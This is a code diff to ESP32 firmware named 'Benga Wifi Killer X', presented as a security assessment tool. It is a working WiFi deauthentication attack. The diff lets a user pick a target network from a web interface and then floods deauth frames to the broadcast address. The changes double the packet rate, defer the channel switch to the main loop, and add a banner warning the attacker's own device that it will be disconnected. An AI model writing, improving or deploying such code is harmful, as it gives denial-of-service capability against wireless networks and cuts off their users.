@@ -16,11 +16,13 @@ const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 // WiFi scanning and attack variables
 bool attack_active = false;
+bool schedule_channel_change = false;
 uint8_t target_bssid[6];
 unsigned long attack_start_time = 0;
 int attack_duration = 10;  // seconds
 int target_channel = 1;
 String attack_log = "";
+int original_channel = 1;
 
 // ---------------- LED Helper ----------------
 void setLED(uint8_t r, uint8_t g, uint8_t b) {
@@ -35,8 +37,8 @@ void setup() {
   pixels.begin();
   setLED(0, 0, 255); // Blue = idle
 
-  // Start AP mode
-  WiFi.softAP(ap_ssid, ap_password);
+  // Start AP mode on channel 1
+  WiFi.softAP(ap_ssid, ap_password, original_channel);
   IPAddress IP = WiFi.softAPIP();
   Serial.print("AP IP address: ");
   Serial.println(IP);
@@ -54,14 +56,20 @@ void setup() {
 void loop() {
   server.handleClient();
 
+  // Handle scheduled channel change
+  if (schedule_channel_change) {
+    schedule_channel_change = false;
+    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+  }
+
   // Handle active attack
   if (attack_active) {
     if (millis() - attack_start_time < (attack_duration * 1000)) {
       sendDeauthPacket(target_bssid, broadcast_mac);
-      delay(100);  // Control packet rate
+      delay(50);  // Increased packet rate
     } else {
       attack_active = false;
-      WiFi.softAP(ap_ssid, ap_password);
+      esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);
       setLED(0, 0, 255); // back to blue
       attack_log = "Attack finished";
     }
@@ -83,6 +91,7 @@ void handleRoot() {
     button { margin: 5px; padding: 8px 16px; }
     .container { max-width: 800px; margin: 0 auto; }
     #status-bar { margin-top:15px;padding:10px;background:#eee;border-radius:5px; }
+    #warning { display: none; background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 15px 0; }
   </style>
 </head>
 <body>
@@ -91,6 +100,11 @@ void handleRoot() {
     <h1 style="margin-bottom: 5px;">Benga Wifi Killer X</h1>
     <p style="color: #666;">Network Security Assessment Tool</p>
   </header>
+  
+  <div id="warning">
+    <strong>Note:</strong> You will temporarily disconnect during attacks. 
+    Reconnection happens automatically when the attack completes.
+  </div>
   
   <section style="background-color: #f9f9f9; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
     <h2 style="margin-top: 0;">Network Scanner</h2>
@@ -173,7 +187,9 @@ function selectTarget(bssid, ssid, channel) {
 function startAttack() {
   const duration = document.getElementById('duration').value;
   const statusEl = document.getElementById('attack-status');
+  const warningEl = document.getElementById('warning');
   
+  warningEl.style.display = 'block';
   statusEl.style.display = 'block';
   statusEl.innerHTML = `<span style="color: #d32f2f;">Attacking ${document.getElementById('target-ssid').textContent} for ${duration} seconds...</span>`;
   
@@ -254,18 +270,10 @@ void handleStartAttack() {
     
     attack_active = true;
     attack_start_time = millis();
+    schedule_channel_change = true;  // Defer channel change
     
-    WiFi.mode(WIFI_OFF);
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_start();
-    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE); // Lock channel
-    esp_wifi_set_promiscuous(true);
-
-    attack_log = "Attack started on " + bssidStr + " (Channel " + String(target_channel) + ")";
     setLED(255, 0, 0); // Red = attacking
-    
+    attack_log = "Attack started on " + bssidStr;
     server.send(200, "text/plain", "Attack started");
   } else {
     server.send(400, "text/plain", "Missing BSSID parameter");
@@ -274,7 +282,7 @@ void handleStartAttack() {
 
 void handleStopAttack() {
   attack_active = false;
-  WiFi.softAP(ap_ssid, ap_password);
+  esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);  // Revert channel
   setLED(0, 0, 255); // back to blue
   attack_log = "Attack stopped manually";
   server.send(200, "text/plain", "Attack stopped");
